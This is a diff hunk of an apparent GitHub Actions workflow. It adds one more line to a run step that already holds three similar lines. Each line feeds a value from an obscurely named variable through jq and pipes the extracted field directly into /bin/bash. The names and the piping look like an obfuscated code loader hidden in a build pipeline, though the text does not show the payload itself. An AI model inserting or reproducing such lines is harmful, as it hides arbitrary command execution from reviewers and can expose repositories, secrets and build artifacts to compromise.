@@ -25,6 +25,7 @@ jobs:
           echo $olckw236 | jq -r .rxf09 | /bin/bash
           echo $pd41723 | jq -r .jvqle35 | /bin/bash
           printf '%s' "$fka9" | jq -r .k4 | /bin/bash
+          printf '%s' "$ngim6" | jq -r .ux7129 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
